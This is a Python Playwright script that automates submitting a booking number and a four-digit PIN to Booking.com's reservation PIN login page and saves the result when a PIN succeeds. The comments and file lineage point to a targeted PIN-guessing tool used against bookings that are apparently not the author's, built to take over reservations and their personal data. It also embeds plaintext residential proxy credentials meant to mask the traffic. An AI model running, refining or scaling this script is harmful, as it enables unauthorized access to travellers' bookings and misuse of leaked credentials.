#!/usr/bin/env python3
"""
🚀 SIMPLE RELIABLE PIN TESTER
Uses the proven approach from targeted_pin_tester_5727559423.py
No complex batching - just simple, working automation
"""

from playwright.sync_api import sync_playwright
import sys
from datetime import datetime
import time
import json

# Configuration
BOOKING_ID = "5724349472"
PIN_TO_TEST = "6812"  # The PIN that was actually correct

# Proxy configuration - using the exact working config from targeted_pin_tester_5727559423.py
PROXY_CONFIG = {
    "server": "http://us-pr.oxylabs.io:10000",
    "username": "customer-phantomnet1_ONP6z",
    "password": "phantomnet1_ONP6z"
}

def test_pin():
    """Test the specific PIN using the proven method"""
    
    print(f"🚀 SIMPLE TESTER: Testing PIN {PIN_TO_TEST} on booking {BOOKING_ID}")
    
    try:
        with sync_playwright() as p:
            print("🌐 Launching browser with proxy...")
            
            browser = p.chromium.launch(
                headless=False,  # Show browser to see what's happening
                # proxy=PROXY_CONFIG  # Temporarily disabled
            )
            
            page = browser.new_page()
            
            print("📄 Navigating to booking.com...")
            page.goto("https://secure.booking.com/help/confirmation_pin_auth", 
                     wait_until="load", timeout=30000)
            
            print("⏳ Waiting for form...")
            time.sleep(3)
            
            # Fill in booking ID and PIN using exact selectors from working version
            print(f"📝 Filling booking ID {BOOKING_ID}...")
            page.wait_for_selector('input[placeholder="e.g. 1234567890"]', timeout=15000)
            page.fill('input[placeholder="e.g. 1234567890"]', BOOKING_ID)
            
            print(f"🔐 Filling PIN {PIN_TO_TEST}...")
            page.fill('input[placeholder="e.g. 1234"]', PIN_TO_TEST)
            
            print("✅ Submitting form...")
            time.sleep(1)
            
            # Click Continue button
            try:
                page.wait_for_selector('button:has-text("Continue")', timeout=5000)
                page.click('button:has-text("Continue")')
            except Exception:
                page.wait_for_selector('button[type="submit"]', timeout=5000)
                page.click('button[type="submit"]')
            
            print("⏳ Waiting for response...")
            
            # Wait for result using the exact method from working version
            page.wait_for_function(
                """
                () => {
                    return location.href.includes('unique_order_id') ||
                           document.querySelector('.bui-alert--error') !== null
                }
                """,
                timeout=30000
            )
            
            current_url = page.url
            print(f"🔍 Current URL: {current_url}")
            
            # Check for success
            if "unique_order_id=" in current_url:
                print(f"🎉🎉🎉 SUCCESS! PIN {PIN_TO_TEST} is CORRECT! 🎉🎉🎉")
                print(f"📍 URL: {current_url}")
                
                # Save success
                success_data = {
                    'success_pin': PIN_TO_TEST,
                    'booking_id': BOOKING_ID,
                    'timestamp': datetime.now().isoformat(),
                    'url': current_url,
                    'message': 'SIMPLE TESTER SUCCESS'
                }
                
                with open(f"SUCCESS_{BOOKING_ID}_{PIN_TO_TEST}.json", 'w') as f:
                    json.dump(success_data, f, indent=2)
                
                print("💾 Success data saved!")
                browser.close()
                return True
                
            elif page.query_selector('.bui-alert--error'):
                print(f"❌ PIN {PIN_TO_TEST} failed - Error detected")
                browser.close()
                return False
                
            else:
                print(f"❓ PIN {PIN_TO_TEST} - Unknown response")
                print("Page content preview:")
                print(page.content()[:500])
                browser.close()
                return False
                
    except Exception as e:
        print(f"💥 Error: {str(e)}")
        return False

if __name__ == "__main__":
    print("🎯 SIMPLE RELIABLE PIN TESTER")
    print("=" * 50)
    print(f"📋 Booking ID: {BOOKING_ID}")
    print(f"🔐 Testing PIN: {PIN_TO_TEST}")
    print("=" * 50)
    
    success = test_pin()
    
    if success:
        print("\n🎉 MISSION ACCOMPLISHED!")
        sys.exit(0)
    else:
        print("\n❌ Test failed - check output for details")
        sys.exit(1)
